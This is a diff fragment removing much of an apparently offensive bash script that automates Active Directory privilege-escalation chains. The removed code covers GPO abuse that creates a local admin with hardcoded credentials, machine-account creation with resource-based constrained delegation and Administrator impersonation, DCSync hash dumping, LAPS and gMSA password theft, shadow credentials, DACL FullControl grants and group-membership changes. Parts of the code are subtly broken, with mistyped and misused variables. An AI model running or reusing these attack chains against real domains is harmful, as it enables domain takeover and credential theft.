-            PS3="Select authentication method: "
-            options=("Password" "NTLM Hash" "Kerberos Ticket" "Quit")
-            auth_success=false
-
-            while true; do
-                select opt in "${options[@]}"; do
-                    case $opt in
-                        "Password")
-                            read -p "[?] Enter username: " username </dev/tty
-                            read -s -p "[?] Enter password: " password </dev/tty
-                            echo
-                            nxc_output=$(nxc ldap "$DC_FQDN" -u "$username" -p "$password" --query "(objectClass=groupPolicyContainer)" "displayname objectGUID")
-                            if echo "$nxc_output" | grep -qiP "\[\+\]\ .*\\\\$username"; then
-                                echo "[+]Authentication successful!" >/dev/tty
-                                auth_success=true
-                            else
-                                echo "[-]Authentication failed. Error output:" >/dev/tty
-                                echo "$nxc_output" >/dev/tty
-                                continue
-                            fi
-                            break 2  # Break out of both select and while loops
-                            ;;
-                        "NTLM Hash")
-                            read -p "[?] Enter username: " username </dev/tty
-                            read -s -p "[?] Enter NTLM hash: " hash </dev/tty
-                            echo
-                            nxc_output=$(nxc ldap "$DC_FQDN" -u "$username" -H "$hash" --query "(objectClass=groupPolicyContainer)" "displayname objectGUID")
-                            if echo "$nxc_output" | grep -qiP "\[\+\]\ .*\\\\$username"; then
-                                echo "Authentication successful!" >/dev/tty
-                                auth_success=true
-                            else
-                                echo "Authentication failed. Error output:" >/dev/tty
-                                echo "$nxc_output" >/dev/tty
-                                continue
-                            fi
-                            break 2  # Break out of both select and while loops
-                            ;;
-                        "Kerberos Ticket")
-                            read -e -p "[?] Enter Kerberos .ccache Path: " ticket </dev/tty
-                            export KRB5CCNAME="$ticket"
-                            GPO_ID=$(nxc ldap "$DC_FQDN" -u "$username" -H "$hash" --query "(objectClass=groupPolicyContainer)" "displayname objectGUID")
-                            echo 
-                            if echo "$nxc_output" | grep -qiP "\[\+\]\ .*\\\\$username"; then
-                                echo "Authentication successful!" >/dev/tty
-                                auth_success=true
-                            else
-                                echo "Authentication failed. Error output:" >/dev/tty
-                                echo "$nxc_output" >/dev/tty
-                                continue
-                            fi
-                            break 2  # Break out of both select and while loops
-                            ;;
-                        "Quit")
-                            return 1
-                            ;;
-                        *) 
-                            echo "Invalid option $REPLY. Please select a valid option (1-4)." >/dev/tty
-                            continue
-                            ;;
-                    esac
-                done
-            done
-
-            if ! "$auth_success"; then
-                echo "Failed to authenticate after multiple attempts" >/dev/tty
-                return 1
-            fi
-        fi
-# ------------------------------------------pygpoabuse-------------------------------------------------
-        GPO_ID=$(echo "$nxc_ouput" | grep -i "Default Domain Policy" -A1 | awk '{print $6}' | tail -n 1)
-        if ! $pygpoabuse ${DOMAIN,,}/${SRC,,} -k -ccache "./$SRC.ccache" -dc-ip "$(echo $DC_FQDN | awk -F"." '{print $1}')" -gpo-id "$GPO_ID" -f 2>&1 | grep -i 'created!' >/dev/tty; then
-            echo -e "\nTASK CREATION FAILED! MAKE SURE GPO-ID AND CREDENTIALS ARE CORRECT\n"
-            return 1
-        else
-            echo -e "\nTASK CREATED! EXECUTE \"gpupdate /force\" ON THE WINDOWS HOST TO CREATE LOCAL ADMIN\n"
-            echo -e "LOCAL ADMIN CREDENTIALS -> \"john:H4x00r123..\"\n"
-            return 0
-        fi   
-    fi     
-
-    if [[ "$TARGET_TYPE" == "Computers" ]]; then
-        echo -e "\n[*] Trying to read LAPS password..." >/dev/tty
-        if ReadLAPSPassword "$DC_FQDN" "$SRC" "$TARGET" "$TARGET_TYPE"; then
-            return 0
-        fi
-        echo "[-] Read LAPS Failed, trying GenricAll exploit"
-#----------------------------------------LDAP AUTH----------------------------------------------
-        echo -e "\n[*] LDAP Authentication" >/dev/tty
-        # Try to authenticate with prev. ticket
-        nxc_output=$(nxc ldap "$DC_FQDN" --use-kcache -M maq 2>&1)
-        if echo "$nxc_output" | grep -qiP "\[\+\]\ .*\\\\$username"; then
-            echo "Authentication successful!" >/dev/tty
-        else
-            # Manual ldap auth
-            PS3="Select authentication method: "
-            options=("Password" "NTLM Hash" "Kerberos Ticket" "Quit")
-            auth_success=false
-
-            while true; do
-                select opt in "${options[@]}"; do
-                    case $opt in
-                        "Password")
-                            read -p "[?] Enter username: " username </dev/tty
-                            read -s -p "[?] Enter password: " password </dev/tty
-                            echo
-                            nxc_output=$(nxc ldap "$DC_FQDN" -u "$username" -p "$password" -M maq 2>&1)
-                            if echo "$nxc_output" | grep -qiP "\[\+\]\ .*\\\\$username"; then
-                                echo "[+]Authentication successful!" >/dev/tty
-                                auth_success=true
-                            else
-                                echo "[-]Authentication failed. Error output:" >/dev/tty
-                                echo "$nxc_output" >/dev/tty
-                                continue
-                            fi
-                            break 2  # Break out of both select and while loops
-                            ;;
-                        "NTLM Hash")
-                            read -p "[?] Enter username: " username </dev/tty
-                            read -s -p "[?] Enter NTLM hash: " hash </dev/tty
-                            echo
-                            nxc_output=$(nxc ldap "$DC_FQDN" -u "$username" -H "$hash" -M maq 2>&1)
-                            if echo "$nxc_output" | grep -qiP "\[\+\]\ .*\\\\$username"; then
-                                echo "Authentication successful!" >/dev/tty
-                                auth_success=true
-                            else
-                                echo "Authentication failed. Error output:" >/dev/tty
-                                echo "$nxc_output" >/dev/tty
-                                continue
-                            fi
-                            break 2  # Break out of both select and while loops
-                            ;;
-                        "Kerberos Ticket")
-                            read -e -p "[?] Enter Kerberos .ccache Path: " ticket </dev/tty
-                            export KRB5CCNAME="$ticket"
-                            nxc_output=$(nxc ldap "$DC_FQDN" --use-kcache -M maq 2>&1)
-                            echo 
-                            if echo "$nxc_output" | grep -qiP "\[\+\]\ .*\\\\$username"; then
-                                echo "Authentication successful!" >/dev/tty
-                                auth_success=true
-                            else
-                                echo "Authentication failed. Error output:" >/dev/tty
-                                echo "$nxc_output" >/dev/tty
-                                continue
-                            fi
-                            break 2  # Break out of both select and while loops
-                            ;;
-                        "Quit")
-                            return 1
-                            ;;
-                        *) 
-                            echo "Invalid option $REPLY. Please select a valid option (1-4)." >/dev/tty
-                            continue
-                            ;;
-                    esac
-                done
-            done
-
-            if ! $auth_success; then
-                echo "Failed to authenticate after multiple attempts" >/dev/tty
-                return 1
-            fi
-        fi
-# -------------------------------EXTRACT MAQ------------------------------
-        local maq=$(echo "$nxc_output" | grep "MachineAccountQuota:" | awk '{print $6}')
-        # Check if MAQ was found
-        if [[ -n "$maq" && "$maq" =~ ^[0-9]+$ ]]; then
-            echo "[+] MachineAccountQuota: $maq" >/dev/tty
-#---------------------------------MAQ=0-----------------------------------------------
-            if [[ "$maq" -eq 0 ]]; then
-                computer_pass=$(cat /dev/urandom | tr -dc 'A-Za-z0-9' | fold -w 32 | head -n 1)
-                echo -e "\n[*] MAQ is 0 -> Trying Password Reset with Password $computer_pass" >/dev/tty
-                if ! addcomputer.py -no-pass -k -computer-name '$TARGET$' -computer-pass '$computer_pass' -no-add; then
-                    echo "[-] Password Reset failed" >/dev/tty
-                    return 1
-                fi
-                getticket "$DC_FQDN" -u "TARGET" -p "$computer_pass"
-            else
-#--------------------------------MAQ>0------------------------------------------------
-                echo -e "\n[*] MAQ is not 0 -> Adding a Computer Account" >/dev/tty
-                computer_name="DESKTOP-$(cat /dev/urandom | tr -dc 'A-Z0-9' | fold -w 8 | head -n 1)\$"
-                computer_pass=$(cat /dev/urandom | tr -dc 'A-Za-z0-9' | fold -w 32 | head -n 1)
-                echo -e "\n[*] Creating a PC account $computer_name with password $computer_pass." >/dev/tty
-                if ! addcomputer.py $DOMAIN/ -no-pass -k -computer-name "$computer_name" -computer-pass "$computer_pass" -dc-host $DC_FQDN; then
-                    echo "[-] Creation failed" >/dev/tty
-                    return 1
-                fi 
-                echo -e "\n[*] Becoming Admin of $TARGET" >/dev/tty
-                if ! rbcd.py $DOMAIN/$SRC -no-pass -k -delegate-from "$computer_name" -delegate-to "$TARGET" -action write; then
-                    echo "[-] rbcd Failed">/dev/tty
-                    return 1
-                fi 
-                get_ticket $DC_FQDN -u $computer_name -p $computer_pass
-                echo -e "\n[*] getST: Impersonating Administrator" >/dev/tty
-                echo 
-                if ! getST.py -k -no-pass -spn "cifs/${TARGET%$}.$DOMAIN" -impersonate Administrator -dc-ip "$DC_FQDN" "$DOMAIN/$computer_name"; then
-                    echo "[-] getST failed">/dev/tty
-                    return 1
-                fi
-            fi
-        else
-            echo "[-] ERROR: Could not determine MachineAccountQuota" >/dev/tty
-            return 1
-        fi
-    fi
-
-    if [[ "$TARGET_TYPE" == "OU" ]]; then
-        echo "Giving GenericAll on Non-Admin Child Objects" >/dev/tty
-        if dacledit.py "$DOMAIN/$SRC" -no-pass -k -action 'write' -rights 'FullControl' -inheritance -principal "$SRC" -target-dn "$TARGET"; then
-            return 0
-        fi
-        if ! WriteGPLink "$1" "$2" "$3" "$4"; then
-            return 1
-        fi
-    fi
-    return 0
-}  
-
-
-DCSync(){                    
-    local DC_FQDN="$1"
-    local SRC="$2"
-    local TARGET="$3"
-    local TARGET_TYPE="$4"
-    local DOMAIN="${DC_FQDN#*.}"
-    export KRB5CCNAME="./$SRC.ccache"
-    
-    dom_base=$(echo $DOMAIN | awk -F"." '{print $1}')
-
-    echo -e "${YELLOW}\n[*] Exploiting \"$2 ---DCSync--> $3\" \n${NC}" >/dev/tty
-
-    while true; do
-        echo "Do you want to dump:" >/dev/tty
-        echo "1. Administrator account only" >/dev/tty
-        echo "2. Specific user(s)" >/dev/tty
-        echo "3. All users" >/dev/tty
-        read -p "Enter your choice (1-3): " choice </dev/tty
-            
-        case $choice in
-            1)
-                if ! secretsdump.py "$DOMAIN/@$DC_FQDN" -k -no-pass -just-dc-user "$dom_base\Administrator"; then
-                    return 1
-                fi
-                break
-                ;;
-            2)
-                read -p "Enter username(s) to dump (comma-separated for multiple): " users </dev/tty
-                IFS=',' read -ra user_array <<< "$users"
-                for user in "${user_array[@]}"; do
-                    if ! secretsdump.py "$DOMAIN/@$DC_FQDN" -k -no-pass -just-dc-user "$dom_base\$user"; then
-                        return 1
-                    fi
-                done
-                break
-                ;;
-            3)
-                if ! secretsdump.py "$DOMAIN/@$DC_FQDN" -k -no-pass; then
-                    return 1
-                fi
-                break
-                ;;
-            *)
-                echo -e "[-] Invalid choice, please try again.\n" >/dev/tty
-                ;;
-        esac
-    done
-    return 0
-}
-
-AllExtendedRights(){
-    local DC_FQDN="$1"
-    local SRC="$2"
-    local TARGET="$3"
-    local TARGET_TYPE="$4"
-    local DOMAIN="${DC_FQDN#*.}"
-    export KRB5CCNAME="./$SRC.ccache"
-
-    echo -e "${YELLOW}\n[*] Exploiting \"$2 ---AllExtendedRights--> $3\" \n${NC}" >/dev/tty
-
-    if [ "$TARGET_TYPE" == 'Users' ]; then
-        ForceChangePassword "$DC_FQDN" "$SRC" "$TARGET" "$TARGET_TYPE"
-
-    elif [ "$TARGET_TYPE" == 'Computers' ]; then
-        ReadLAPSPassword "$DC_FQDN" "$SRC" "$TARGET" "$TARGET_TYPE"
-
-    elif [ "$TARGET_TYPE" == 'Domain' ]; then
-        DCSync "$DC_FQDN" "$SRC" "$TARGET" "$TARGET_TYPE"
-    
-    else
-        echo "[-] ERROR: Invalid target type '$TARGET_TYPE'" >/dev/tty
-        echo "[-] Valid target types are: Users, Computers, Domain" >/dev/tty
-        return 1
-    fi
-}
-
-AddMember(){
-    local DC_FQDN="$1"
-    local SRC="$2"
-    local TARGET="$3"
-    local TARGET_TYPE="$4"
-    local DOMAIN="${DC_FQDN#*.}"
-    export KRB5CCNAME="./$SRC.ccache"
-
-    echo -e "${YELLOW}\n[*] Exploiting \"$2 ---AddMember--> $3\" \n${NC}" >/dev/tty
-
-    # Get user input with validation
-    while true; do
-        read -r -p "Input member to add/remove: " member </dev/tty
-        if [[ -n "$member" ]]; then
-            break
-        fi
-        echo -e "[-] ERROR: Member cannot be empty" >/dev/tty
-    done
-
-    while true; do
-        read -r -p "Input action (add/remove): " action </dev/tty
-        action=$(echo "$action" | tr '[:upper:]' '[:lower:]')
-        if [[ "$action" == "add" || "$action" == "remove" ]]; then
-            break
-        fi
-        echo -e "[-] ERROR: Action must be either 'add' or 'remove'" >/dev/tty
-    done
-
-    # Execute the operation
-    if bloodyAD --host "$DC_FQDN" -d "$DOMAIN" -k "$action" groupMember "$TARGET" "$member"; then
-        echo -e "[+] Successfully performed $action operation on $member$" >/dev/tty
-        return 0
-    else
-        return 1
-    fi
-}
-
-GenericWrite(){
-    local DC_FQDN="$1"
-    local SRC="$2"
-    local TARGET="$3"
-    local TARGET_TYPE="$4"
-    local DOMAIN="${DC_FQDN#*.}"
-    export KRB5CCNAME="./$SRC.ccache"
-    echo -e "${YELLOW}\n[*] Exploiting \"$2 ---GenericWrite--> $3\" \n${NC}"
-
-    if [[ "$TARGET_TYPE" == "User" ]]; then
-        certipy-ad shadow auto -k -no-pass -dc-host "$DC_FQDN" -account "$TARGET" -dc-ip "$DC_IP"
-        certipy_rc=$?
-        
-        if [[ $certipy_rc -eq 0 && -s ${TARGET,,}.ccache ]]; then
-            mv ${TARGET,,}.ccache "./${TARGET}.ccache"
-            export KRB5CCNAME="./${TARGET}.ccache"
-            klist
-            exit 0  # Explicitly return success from certipy
-        else
-            # If certipy failed, try WriteSPN
-            if WriteSPN "$DC_FQDN" "$SRC" "$TARGET" "$TARGET_TYPE"; then
-                exit $?  # Return WriteSPN's return code (should be 0 if successful)
-            else
-                # If WriteSPN failed, try ForceChangePassword and return its code
-                ForceChangePassword "$DC_FQDN" "$SRC" "$TARGET" "$TARGET_TYPE"
-                exit $?  # Return ForceChangePassword's return code
-            fi
-        fi
-    elif [[ "$TARGET_TYPE" == "Group" ]]; then
-        AddMember "$DC_FQDN" "$SRC" "$TARGET" "$TARGET_TYPE"
-    elif [[ "$TARGET_TYPE" == "OU" ]]; then
-        WriteGPLink "$DC_FQDN" "$SRC" "$TARGET" "$TARGET_TYPE"
-    fi
-}
-
-
-ReadLAPSPassword() {
-    local DC_FQDN="$1"
-    local SRC="$2"
-    local TARGET="$3"
-    local TARGET_TYPE="$4"
-    local DOMAIN="${DC_FQDN#*.}"
-    export KRB5CCNAME="./$SRC.ccache"
-
-    echo -e "${YELLOW}\n[*] Exploiting \"$2 ---ReadLAPSPassword--> $3\" \n${NC}" >/dev/tty
-
-    # LAPS password retrieval
-    laps=$(bloodyAD --host "$DC_FQDN" -d "$DOMAIN" -k get search --filter '(ms-mcs-admpwd=*)' --attr ms-mcs-admpwd 2>&1)
-    if [[ ! -z "$laps" ]]; then
-        echo -e "[+] Found LAPS Password: $laps" >/dev/tty
-        echo -e "Attempting Local Admin Authentication on \"$TARGET\"" >/dev/tty
-        nxc smb -u Administrator -p "$laps" --local-auth -x "whoami" >/dev/tty
-        nxc smb -u Administrator -p "$laps" -x "whoami" >/dev/tty
-        return 0
-    else
-        echo "[-] No LAPS password found" >/dev/tty
-        return 1
-    fi
-}
-
-
-ReadGMSAPassword(){
-    local DC_FQDN="$1"
-    local SRC="$2"
-    local TARGET="$3"
-    local TARGET_TYPE="$4"
-    local DOMAIN="${DC_FQDN#*.}"
-    export KRB5CCNAME="./$SRC.ccache"
-
-    echo -e "${YELLOW}\n[*] Exploiting \"$2 ---ReadGMSAPassword--> $3\" \n${NC}" >/dev/tty
-    
-    output=$(bloodyAD --host "$DC_FQDN" -d "$DOMAIN" -k get object "$TARGET" --attr msDS-ManagedPassword)
-    target_hash=$(echo "$output" | grep -i msDS-ManagedPassword.NTLM | awk -F":" '{print $3}')
-    echo -e "Found \"$TARGET\" Hash: $target_hash" >/dev/tty
-    if get_ticket "$DC_FQDN" -u "$TARGET" -H "$target_hash"; then
-        return 0
-    else
-        return 1
-    fi
-}
 
 # Proceed with exploitation
 echo -e "\nProceeding with exploitation..."
@@ -2040,3 +1080,5 @@ for chain in "${selected_chains[@]}"; do
         done
     done
 done
+
+
